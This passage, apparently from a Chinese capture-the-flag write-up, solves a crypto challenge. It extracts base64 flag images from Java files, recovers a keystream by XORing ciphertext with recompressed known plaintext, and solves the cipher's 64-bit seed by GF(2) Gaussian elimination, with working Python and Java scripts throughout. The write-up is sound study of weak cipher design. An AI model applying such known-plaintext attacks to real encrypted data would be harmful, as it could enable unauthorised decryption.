</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=p>(</span><span class=n>off</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>table</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>end</span> <span class=o>=</span> <span class=n>table</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=k>if</span> <span class=n>i</span><span class=o>+</span><span class=mi>1</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>table</span><span class=p>)</span> <span class=k>else</span> <span class=nb>len</span><span class=p>(</span><span class=n>plain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>comp</span> <span class=o>=</span> <span class=n>plain</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>end</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>lzrr_decompress</span><span class=p>(</span><span class=n>comp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>out_dir</span> <span class=o>/</span> <span class=n>name</span><span class=p>)</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;main&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>unpack_one</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>unpack_one</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>每个 Image1Part 是：private static final String IMAGE_DATA = &ldquo;&mldr;.base64&mldr;.";写脚本提取出来即可</p><p>提取脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span><span class=o>,</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_jpg</span><span class=p>(</span><span class=n>java_path</span><span class=p>:</span> <span class=n>Path</span><span class=p>,</span> <span class=n>out_path</span><span class=p>:</span> <span class=n>Path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>java_path</span><span class=o>.</span><span class=n>read_text</span><span class=p>(</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;IMAGE_DATA\s*=\s*&#34;([^&#34;]+)&#34;&#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>m</span><span class=p>,</span> <span class=s2>&#34;no IMAGE_DATA&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>b64</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out_path</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>b64</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>  <span class=n>extract_jpg</span><span class=p>(</span><span class=n>Path</span><span class=p>(</span><span class=s2>&#34;out/batch3_files/flagImage_Image1Part3.java&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;out/flag_part_3.jpg&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>解压解密后得到flag part 1，3，5，6</p><p>对于batch2，利用明文线性仿射得到seed</p><p>用题目压缩器 Il1 压缩 ParticlePhysicsSimulator.java</p><p>用一个 Java wrapper 调 <code>i.l.Il1.Il1(byte[])</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>i.l.Il1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Compress</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Files</span><span class=p>.</span><span class=na>readAllBytes</span><span class=p>(</span><span class=n>Paths</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>args</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>out</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Il1</span><span class=p>.</span><span class=na>Il1</span><span class=p>(</span><span class=n>in</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>out</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>编译并运行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=n>javac</span><span class=w> </span><span class=o>-</span><span class=n>cp</span><span class=w> </span><span class=n>work</span><span class=o>/</span><span class=n>recovered_classes</span><span class=w> </span><span class=n>Compress</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>java</span><span class=w> </span><span class=o>-</span><span class=n>cp</span><span class=w> </span><span class=n>work</span><span class=o>/</span><span class=n>recovered_classes</span>:<span class=p>.</span><span class=w> </span><span class=n>Compress</span><span class=w> </span><span class=err>\</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>work</span><span class=o>/</span><span class=n>unknown_zip</span><span class=o>/</span><span class=n>app</span><span class=o>/</span><span class=n>src</span><span class=o>/</span><span class=n>main</span><span class=o>/</span><span class=n>java</span><span class=o>/</span><span class=n>com</span><span class=o>/</span><span class=n>unknown</span><span class=o>/</span><span class=n>ParticlePhysicsSimulator</span><span class=p>.</span><span class=n>java</span><span class=w> </span><span class=err>\</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=o>&gt;</span><span class=w> </span><span class=n>work</span><span class=o>/</span><span class=n>out</span><span class=o>/</span><span class=n>pps_comp</span><span class=p>.</span><span class=n>bin</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>计算 keystream：K = C XOR P</p><p>取 batch2 ciphertext 的前 3577 bytes，和 pps_comp.bin xor：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>C</span> <span class=o>=</span> <span class=p>(</span><span class=n>Path</span><span class=p>(</span><span class=s2>&#34;work/batches/batch2_cipher.bin&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>())[:</span><span class=mi>3577</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>P</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;work/out/pps_comp.bin&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>K</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>a</span> <span class=o>^</span> <span class=n>b</span> <span class=k>for</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>C</span><span class=p>,</span> <span class=n>P</span><span class=p>)])</span>  <span class=c1># keystream 前缀</span>
</span></span><span class=line><span class=cl><span class=n>Path</span><span class=p>(</span><span class=s2>&#34;work/out/ks_prefix.bin&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>K</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以用 <code>Runner.encrypt(key0, zeros, seed)</code> 直接得到 <code>K(seed)</code>（因为输入全 0，输出就是 keystream）。 而：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=n>K</span><span class=p>(</span><span class=n>s1</span><span class=p>)</span><span class=w> </span><span class=no>XOR</span><span class=w> </span><span class=n>K</span><span class=p>(</span><span class=n>s2</span><span class=p>)</span><span class=w> </span><span class=no>XOR</span><span class=w> </span><span class=n>K</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>K</span><span class=p>(</span><span class=n>s1</span><span class=w> </span><span class=no>XOR</span><span class=w> </span><span class=n>s2</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>这说明是仿射线性：<code>K(seed) = K(0) XOR (A * seed_bits)</code>。</p><p>因此用 64 个 basis seed（<code>1&lt;&lt;i</code>）采样就能建立线性方程组，做高斯消元解出 seed。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>JAVA_CP</span> <span class=o>=</span> <span class=s2>&#34;recovered_classes:.&#34;</span>
</span></span><span class=line><span class=cl><span class=n>KEY0</span>    <span class=o>=</span> <span class=s2>&#34;key0.b64&#34;</span>
</span></span><span class=line><span class=cl><span class=n>ZEROS64</span> <span class=o>=</span> <span class=s2>&#34;out/zeros64.bin&#34;</span>
</span></span><span class=line><span class=cl><span class=n>OUTTMP</span>  <span class=o>=</span> <span class=s2>&#34;out/_ks_tmp.bin&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Path</span><span class=p>(</span><span class=n>ZEROS64</span><span class=p>)</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>keystream64</span><span class=p>(</span><span class=n>seed_hex</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=s2>&#34;java&#34;</span><span class=p>,</span> <span class=s2>&#34;-cp&#34;</span><span class=p>,</span> <span class=n>JAVA_CP</span><span class=p>,</span> <span class=s2>&#34;Decrypt&#34;</span><span class=p>,</span> <span class=n>KEY0</span><span class=p>,</span> <span class=n>seed_hex</span><span class=p>,</span> <span class=n>ZEROS64</span><span class=p>,</span> <span class=n>OUTTMP</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>Path</span><span class=p>(</span><span class=n>OUTTMP</span><span class=p>)</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_bytes</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>):</span> <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>x</span><span class=o>^</span><span class=n>y</span> <span class=k>for</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bytes_to_bits_le</span><span class=p>(</span><span class=n>b</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>bits</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>byte</span> <span class=ow>in</span> <span class=n>b</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>byte</span><span class=o>&gt;&gt;</span><span class=n>k</span><span class=p>)</span><span class=o>&amp;</span><span class=mi>1</span><span class=p>)</span>  <span class=c1># 低位-&gt;高位：只要一致即可</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>bits</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_seed_from_keystream</span><span class=p>(</span><span class=n>K_obs</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>prefix_bytes</span><span class=o>=</span><span class=mi>16</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>K0</span> <span class=o>=</span> <span class=n>keystream64</span><span class=p>(</span><span class=s2>&#34;0000000000000000&#34;</span><span class=p>)[:</span><span class=n>prefix_bytes</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span>  <span class=o>=</span> <span class=n>xor_bytes</span><span class=p>(</span><span class=n>K_obs</span><span class=p>[:</span><span class=n>prefix_bytes</span><span class=p>],</span> <span class=n>K0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>d_bits</span> <span class=o>=</span> <span class=n>bytes_to_bits_le</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n_eq</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>d_bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># columns[i] 是 seed 第 i 位对输出 bits 的贡献</span>
</span></span><span class=line><span class=cl>    <span class=n>cols</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>Ki</span> <span class=o>=</span> <span class=n>keystream64</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=n>i</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)[:</span><span class=n>prefix_bytes</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>cols</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>bytes_to_bits_le</span><span class=p>(</span><span class=n>xor_bytes</span><span class=p>(</span><span class=n>Ki</span><span class=p>,</span> <span class=n>K0</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 组装为 row 方程：rows[j] 是第 j 条方程的 64-bit 系数</span>
</span></span><span class=line><span class=cl>    <span class=n>rows</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>rhs</span>  <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n_eq</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>coeff</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>cols</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>coeff</span> <span class=o>|=</span> <span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>rows</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>coeff</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>rhs</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>d_bits</span><span class=p>[</span><span class=n>j</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># GF(2) 高斯消元</span>
</span></span><span class=line><span class=cl>    <span class=n>piv</span> <span class=o>=</span> <span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>*</span><span class=mi>64</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>pivot</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>rr</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>n_eq</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>rows</span><span class=p>[</span><span class=n>rr</span><span class=p>]</span><span class=o>&gt;&gt;</span><span class=n>c</span><span class=p>)</span><span class=o>&amp;</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>pivot</span> <span class=o>=</span> <span class=n>rr</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pivot</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>rows</span><span class=p>[</span><span class=n>r</span><span class=p>],</span> <span class=n>rows</span><span class=p>[</span><span class=n>pivot</span><span class=p>]</span> <span class=o>=</span> <span class=n>rows</span><span class=p>[</span><span class=n>pivot</span><span class=p>],</span> <span class=n>rows</span><span class=p>[</span><span class=n>r</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>rhs</span><span class=p>[</span><span class=n>r</span><span class=p>],</span>  <span class=n>rhs</span><span class=p>[</span><span class=n>pivot</span><span class=p>]</span>  <span class=o>=</span> <span class=n>rhs</span><span class=p>[</span><span class=n>pivot</span><span class=p>],</span>  <span class=n>rhs</span><span class=p>[</span><span class=n>r</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>piv</span><span class=p>[</span><span class=n>c</span><span class=p>]</span> <span class=o>=</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>rr</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n_eq</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>rr</span> <span class=o>!=</span> <span class=n>r</span> <span class=ow>and</span> <span class=p>((</span><span class=n>rows</span><span class=p>[</span><span class=n>rr</span><span class=p>]</span><span class=o>&gt;&gt;</span><span class=n>c</span><span class=p>)</span><span class=o>&amp;</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>rows</span><span class=p>[</span><span class=n>rr</span><span class=p>]</span> <span class=o>^=</span> <span class=n>rows</span><span class=p>[</span><span class=n>r</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>rhs</span><span class=p>[</span><span class=n>rr</span><span class=p>]</span>  <span class=o>^=</span> <span class=n>rhs</span><span class=p>[</span><span class=n>r</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 回代</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>63</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>pr</span> <span class=o>=</span> <span class=n>piv</span><span class=p>[</span><span class=n>c</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pr</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>rest</span> <span class=o>=</span> <span class=n>rows</span><span class=p>[</span><span class=n>pr</span><span class=p>]</span> <span class=o>&amp;</span> <span class=o>~</span><span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>rhs</span><span class=p>[</span><span class=n>pr</span><span class=p>]</span> <span class=o>^</span> <span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>rest</span> <span class=o>&amp;</span> <span class=n>x</span><span class=p>)</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>s</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>|=</span> <span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 观测 keystream：来自 C XOR P</span>
</span></span><span class=line><span class=cl><span class=n>K_obs</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;out/ks_prefix.bin&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>seed</span> <span class=o>=</span> <span class=n>solve_seed_from_keystream</span><span class=p>(</span><span class=n>K_obs</span><span class=p>,</span> <span class=n>prefix_bytes</span><span class=o>=</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;seed =&#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>seed</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>得到seed：a91b1bb4e8978bda</p><p>用seed 解 batch2，得到 Image1Part2 / Image1Part4</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=n>java</span><span class=w> </span><span class=o>-</span><span class=n>cp</span><span class=w> </span><span class=n>work</span><span class=o>/</span><span class=n>recovered_classes</span>:<span class=p>.</span><span class=w> </span><span class=n>Decrypt</span><span class=w> </span><span class=n>work</span><span class=o>/</span><span class=n>key0</span><span class=p>.</span><span class=n>b64</span><span class=w> </span><span class=n>a91b1bb4e8978bda</span><span class=w> </span><span class=err>\</span><span class=w>
